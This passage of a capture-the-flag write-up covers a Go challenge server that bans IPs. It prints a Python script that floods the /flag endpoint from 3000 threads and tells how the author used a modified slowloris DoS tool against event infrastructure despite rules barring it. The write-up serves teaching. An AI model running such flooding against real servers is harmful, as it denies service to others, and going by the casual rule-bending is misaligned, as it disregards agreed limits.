+			if msg, ok := msg.(time.Time); ok {
+				packetTime = msg
+			}
+		}
+
+		info, err := GetPacketInfo(packetData)
+		if err != nil {
+			log.Printf(&amp;#34;invalid packet raw=%q&amp;#34;, packetData)
+			return 0
+		}
+		info.ArrivedAt = packetTime
+
+		select {
+		case packetStream &amp;lt;- *info:
+		default:
+			log.Fatalf(&amp;#34;closed channel or overflow&amp;#34;)
+			cancel()
+		}
+		return 0
+	}
+
+	err = nf.Register(ctx, funcHook)
+	if err != nil {
+		cancel()
+		return nil, err
+	}
+
+	return packetStream, nil
+}
+
+func workerFirewall() {
+	packetStream, err := GetPacketStream()
+	if err != nil {
+		log.Fatal(&amp;#34;packetStream err&amp;#34;, err)
+	}
+	for pkt := range packetStream {
+		if GlobalDB.Ban(pkt.FromIP.String(), time.Minute) {
+			log.Printf(&amp;#34;banning suspicious connection = %&amp;#43;v\n&amp;#34;, pkt)
+		}
+	}
+}
+
+type localDB struct {
+	mu     sync.RWMutex
+	banned map[string]time.Time
+}
+
+func NewLocalDB() *localDB {
+	return &amp;amp;localDB{
+		banned: make(map[string]time.Time),
+	}
+}
+
+func (c *localDB) Ban(remoteIP string, expireDuration time.Duration) bool {
+	c.mu.Lock()
+	c.banned[remoteIP] = time.Now().Add(expireDuration)
+	c.mu.Unlock()
+	return true
+}
+
+func (c *localDB) IsBanned(remoteIP string) bool {
+	c.mu.RLock()
+	expireAt, exists := c.banned[remoteIP]
+	c.mu.RUnlock()
+	if !exists {
+		return false
+	}
+	if time.Since(expireAt).Seconds() &amp;gt; 0 {
+		return false
+	}
+	return true
+}
+
+func setupNftables() {
+	nftScript := `#!/usr/sbin/nft -f
+
+	table inet chall_pepega_%interface% {}
+	delete table inet chall_pepega_%interface%
+	table inet chall_pepega_%interface% {
+		chain input {
+			type filter hook input priority 0; policy accept;
+			iif &amp;#34;%interface%&amp;#34; tcp dport %port% log group %nfgroup%
+		}
+	}
+	`
+	nftScript = strings.ReplaceAll(nftScript, &amp;#34;%interface%&amp;#34;, interfaceString)
+	nftScript = strings.ReplaceAll(nftScript, &amp;#34;%port%&amp;#34;, portString)
+	nftScript = strings.ReplaceAll(nftScript, &amp;#34;%nfgroup%&amp;#34;, strconv.Itoa(int(nflogGroup)))
+
+	cmd := exec.Command(&amp;#34;/usr/sbin/nft&amp;#34;, &amp;#34;-f&amp;#34;, &amp;#34;-&amp;#34;)
+	cmd.Stdin = strings.NewReader(nftScript)
+
+	output, err := cmd.CombinedOutput()
+	if err != nil {
+		log.Fatalf(&amp;#34;Error executing nft script: err=%&amp;#43;v\nerror output:\n%s\n&amp;#34;, err, output)
+	}
+}
+
+func getInterfaceIP(interfaceName string) (net.IP, error) {
+	iface, err := net.InterfaceByName(interfaceName)
+	if err != nil {
+		return nil, err
+	}
+
+	addrs, err := iface.Addrs()
+	if err != nil {
+		return nil, err
+	}
+
+	for _, addr := range addrs {
+		ipNet, ok := addr.(*net.IPNet)
+		if ok &amp;amp;&amp;amp; !ipNet.IP.IsLoopback() {
+			if ipNet.IP.To4() != nil {
+				return ipNet.IP, nil
+			}
+		}
+	}
+
+	return nil, fmt.Errorf(&amp;#34;no IP address found for interface %s&amp;#34;, interfaceName)
+}
+
+func workerHttp() {
+	http.HandleFunc(&amp;#34;/&amp;#34;, func(w http.ResponseWriter, r *http.Request) {
+		fmt.Fprintln(w, &amp;#34;Welcome to the 🐸packets!!! Now please get fast 🐸 flag!&amp;#34;)
+	})
+	http.HandleFunc(&amp;#34;/flag&amp;#34;, func(w http.ResponseWriter, r *http.Request) {
+		w.Header().Set(&amp;#34;Content-Type&amp;#34;, &amp;#34;text/plain&amp;#34;)
+		flusher, ok := w.(http.Flusher)
+		if !ok {
+			http.Error(w, &amp;#34;Streaming not supported&amp;#34;, http.StatusInternalServerError)
+			return
+		}
+		remoteAddrStr, _, err := net.SplitHostPort(r.RemoteAddr)
+		if err != nil {
+			http.Error(w, fmt.Sprintf(&amp;#34;Error extracting remote address, ip=%s&amp;#34;, r.RemoteAddr), http.StatusInternalServerError)
+			return
+		}
+		remoteAddr := net.ParseIP(remoteAddrStr).To4()
+		if len(remoteAddr) != 4 {
+			http.Error(w, fmt.Sprintf(&amp;#34;Error parsing remote address, ip=%s, ip=%s&amp;#34;, r.RemoteAddr, remoteAddrStr), http.StatusInternalServerError)
+			return
+		}
+
+		for i := 1; i &amp;lt;= 5; i&amp;#43;&amp;#43; {
+			fmt.Fprintf(w, &amp;#34;Validating your request [%d/5], please wait 🐸🐸🐸\n&amp;#34;, i)
+			flusher.Flush()
+
+			if GlobalDB.IsBanned(remoteAddr.String()) {
+				fmt.Fprintln(w, &amp;#34;Sad 🐸 You are banned 😢&amp;#34;)
+				return
+			}
+			time.Sleep(time.Second)
+		}
+
+		fmt.Fprintf(w, &amp;#34;Here you go!!! 🐸 Flag: %s&amp;#34;, flagString)
+	})
+
+	serverIP, err := getInterfaceIP(interfaceString)
+	if err != nil {
+		log.Fatal(&amp;#34;getInterfaceIP err: &amp;#34;, err)
+	}
+	log.Printf(&amp;#34;Listen on %s:%s\n&amp;#34;, serverIP, portString)
+
+	server := &amp;amp;http.Server{
+		Addr:         serverIP.String() &amp;#43; &amp;#34;:&amp;#34; &amp;#43; portString,
+		Handler:      http.DefaultServeMux,
+		ReadTimeout:  10 * time.Second,
+		WriteTimeout: 10 * time.Second,
+	}
+	listener, err := net.Listen(&amp;#34;tcp&amp;#34;, server.Addr)
+	if err != nil {
+		log.Fatal(&amp;#34;Error creating listener: &amp;#34;, err)
+	}
+	rawListener, err := listener.(*net.TCPListener).File()
+	if err != nil {
+		log.Fatal(&amp;#34;Error getting raw listener file: &amp;#34;, err)
+	}
+	if err := syscall.SetsockoptString(int(rawListener.Fd()), syscall.SOL_SOCKET, syscall.SO_BINDTODEVICE, interfaceString); err != nil {
+		log.Fatal(&amp;#34;Error setting SO_BINDTODEVICE option: &amp;#34;, err)
+	}
+	if err := server.Serve(listener); err != nil {
+		log.Fatal(&amp;#34;server.ListenAndServe err: &amp;#34;, err)
+	}
+}
+
+var GlobalDB *localDB
+var flagString string
+var portString string
+var interfaceString string
+var nflogGroup uint16
+
+func main() {
+	flagString = os.Getenv(&amp;#34;FLAG&amp;#34;)
+	if len(flagString) == 0 {
+		log.Fatal(&amp;#34;flag is empty&amp;#34;)
+	}
+
+	portString = os.Getenv(&amp;#34;LISTEN_PORT&amp;#34;)
+	if len(portString) == 0 {
+		portString = &amp;#34;8080&amp;#34;
+	}
+
+	interfaceString = os.Getenv(&amp;#34;LISTEN_INTERFACE&amp;#34;)
+	if len(interfaceString) == 0 {
+		interfaceString = &amp;#34;eth0&amp;#34;
+	}
+
+	nflogGroupStr := os.Getenv(&amp;#34;NFLOG_GROUP&amp;#34;)
+	if len(nflogGroupStr) == 0 {
+		nflogGroupStr = &amp;#34;100&amp;#34;
+	}
+	nflogGroup64, err := strconv.ParseUint(nflogGroupStr, 10, 16)
+	if err != nil {
+		log.Fatal(&amp;#34;invalid nflog group&amp;#34;)
+	}
+	nflogGroup = uint16(nflogGroup64)
+
+	GlobalDB = NewLocalDB()
+
+	setupNftables()
+
+	go workerFirewall()
+	workerHttp()
+}
+
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+
+
+&lt;p&gt;We can see that to get the flag, all you have to do is to request the &lt;code&gt;/flag&lt;/code&gt; endpoint and if you&amp;rsquo;re not banned for 5 seconds, it&amp;rsquo;ll give you the flag.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;fmt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Fprintf&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;w&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Validating your request [%d/5], please wait 🐸🐸🐸\n&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;flusher&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Flush&lt;/span&gt;()
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;GlobalDB&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;IsBanned&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;remoteAddr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;String&lt;/span&gt;()) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#a6e22e&#34;&gt;fmt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Fprintln&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;w&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Sad 🐸 You are banned 😢&amp;#34;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;time&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Sleep&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;time&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Second&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fmt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Fprintf&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;w&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Here you go!!! 🐸 Flag: %s&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;flagString&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;It checks if your IP (&lt;code&gt;remoteAddr&lt;/code&gt;) is banned every second for 5 seconds, and we can find that our IP gets banned for 1 minute when we connect to the server initially in &lt;code&gt;workerFirewall()&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;func&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;() {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;go&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;workerFirewall&lt;/span&gt;()
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;workerHttp&lt;/span&gt;()
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;func&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;workerFirewall&lt;/span&gt;() {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;packetStream&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;GetPacketStream&lt;/span&gt;()
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Fatal&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;packetStream err&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;pkt&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;range&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;packetStream&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;GlobalDB&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Ban&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;pkt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;FromIP&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;String&lt;/span&gt;(), &lt;span style=&#34;color:#a6e22e&#34;&gt;time&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Minute&lt;/span&gt;) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Printf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;banning suspicious connection = %+v\n&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;pkt&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The &lt;code&gt;go&lt;/code&gt; before &lt;code&gt;workerFirewall()&lt;/code&gt; essentially means that the function runs asynchronosly, allowing &lt;code&gt;workerHttp()&lt;/code&gt; to be ran alongside &lt;code&gt;workerFirewall()&lt;/code&gt;, which bans our IP address.&lt;/p&gt;
+&lt;p&gt;Clearly, we are trying to race the functions in order to send a request where &lt;code&gt;workerFirewall()&lt;/code&gt; takes longer than 5 seconds to respond and ban our IP, so we are able to fetch the flag before we are banned. This is also hinted by in the challenge description.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Can you be faster enough?&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;The naive approach is to simply flood the server with requests on one computer, and use another computer with a seperate IP to request the flag, hoping that the server will lag enough that their IP takes &amp;gt;5 seconds to be banned.&lt;/p&gt;
+&lt;p&gt;I coded up a horrendous partially GPT generated python script, with threads to continuesly ping the server to see if this was even viable.&lt;/p&gt;
+
+
+
+  &lt;div class=&#34;collapsable-code&#34;&gt;
+    &lt;input id=&#34;5&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;5&#34;&gt;
+      &lt;span class=&#34;collapsable-code__language&#34;&gt;python&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__title&#34;&gt;not_ddos.py&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
+    &lt;/label&gt;
+    &lt;pre class=&#34;language-python&#34; &gt;&lt;code&gt;
+import requests
+import threading
+import time
+
+
+def flood():
+    for i in range(10000000):
+        resp = requests.get(&amp;#34;http://10.0.14.2:8080/flag&amp;#34;)
+        #print(resp.text)
+    print(&amp;#34;ended&amp;#34;)
+
+# Number of threads to run
+num_threads = 3000
+
+# Create and start the threads
+threads = []
+for i in range(num_threads):
+    thread = threading.Thread(target=flood, name=f&amp;#34;Thread-{i&amp;#43;1}&amp;#34;)
+    thread.start()
+    threads.append(thread)
+    print(i)
+
+# Wait for all threads to finish
+for thread in threads:
+    thread.join()
+
+print(&amp;#34;All threads have completed.&amp;#34;)
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+
+
+&lt;p&gt;Surprisingly, it actually worked! With a teammate&amp;rsquo;s computer, they requested the &lt;code&gt;/flag&lt;/code&gt; endpoint with their not-yet-banned IP, and got this message:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Validating your request [1/5], please wait 🐸🐸🐸
+Validating your request [2/5], please wait 🐸🐸🐸
+Sad 🐸 You are banned 😢
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We got to &lt;code&gt;2/5&lt;/code&gt;, meaning it lagged the server for around 1 second! Clearly, we just needed a few more requests.&lt;/p&gt;
+&lt;p&gt;However, it was at this point when my team started trying to persuade me against DDoS&amp;rsquo;ing the challenge infra, as I took their computers away for more manpower. To be fair, it was in the rules that attacking infra and brute force attacks were not allowed.&lt;/p&gt;
+
+  &lt;img src=&#34;./img/rules.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px;&#34;  /&gt;
+
+
+&lt;p&gt;So after several failed attemps with thousands of python threads and another teammate&amp;rsquo;s computer, I asked the organisers in person if what I was doing is intended and if it was allowed.&lt;/p&gt;
+&lt;p&gt;I was told it wasn&amp;rsquo;t intended (wasn&amp;rsquo;t too surprising) and a maybe for if it was allowed. So I took it as a yes and continued my method.&lt;/p&gt;
+&lt;p&gt;Without my teammate&amp;rsquo;s support and resources, I would need to find a way to lag the server using just one computer. What I was doing was essentially DoS&amp;rsquo;ing the infra with my own script - but there are lots of DoS scripts out there already! So why not just steal one from GitHub?&lt;/p&gt;
+&lt;p&gt;I came across &lt;a href=&#34;https://github.com/gkbrk/slowloris&#34;&gt;this DoS tool&lt;/a&gt; which looked good, using sockets instead of requests.&lt;/p&gt;
+
+  &lt;img src=&#34;./img/slowloris.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px;&#34;  /&gt;
+
+
+&lt;p&gt;Modifying the code to accept floats as delay values for even faster DoS&amp;rsquo;ing, I convinced my teammate that it was not a DoS script and I was not breaking any rules, quick just &lt;code&gt;curl /flag&lt;/code&gt; endpoint easy flag.&lt;/p&gt;
+&lt;p&gt;And it worked.&lt;/p&gt;
+
+  &lt;img src=&#34;./img/ddos_lol.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px;&#34;  /&gt;
+
+
+&lt;p&gt;Here you can see on my teammate &lt;a href=&#34;https://twitter.com/torrytwooo&#34;&gt;torry2&amp;rsquo;s&lt;/a&gt; computer, we successfully lagged the server enough with the DoS tool and blooded the challenge &lt;code&gt;p4{wow-you-are-very-fast-pepega!}&lt;/code&gt;.&lt;/p&gt;
+
+  &lt;img src=&#34;./img/pepega_blood.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px;&#34;  /&gt;
+
+
+&lt;h4 id=&#34;intended-solution&#34;&gt;Intended solution&lt;/h4&gt;
+&lt;p&gt;After the event, it was revealed that out of the 5 teams that solved the challenge, none of their solutions were intended - everyone went with the request flooding method.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;cypis&lt;/code&gt;, the challenge author, later revealed that only 1 packet, not 100000, was required to solve the challenge.&lt;/p&gt;
+&lt;p&gt;We can see that &lt;code&gt;workerFirewall()&lt;/code&gt; uses &lt;code&gt;GetPacketInfo()&lt;/code&gt; to obtain our remote IP, so we could make the function hang or return an error to cause our IP to never be returned.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;func&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;GetPacketInfo&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;data&lt;/span&gt; []&lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;) (&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;PacketInfo&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;error&lt;/span&gt;) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;netPacket&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;layers&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;UnpackAll&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;data&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;packet&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;IPv4&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;ipInfo&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;ok&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;netPacket&lt;/span&gt;.(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;ipv4&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Packet&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; !&lt;span style=&#34;color:#a6e22e&#34;&gt;ok&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;errors&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;New&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;not ip packet&amp;#34;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;tcpInfo&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;ok&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;netPacket&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Payload&lt;/span&gt;().(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;tcp&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Packet&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; !&lt;span style=&#34;color:#a6e22e&#34;&gt;ok&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;errors&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;New&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;not tcp packet&amp;#34;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;PacketInfo&lt;/span&gt;{
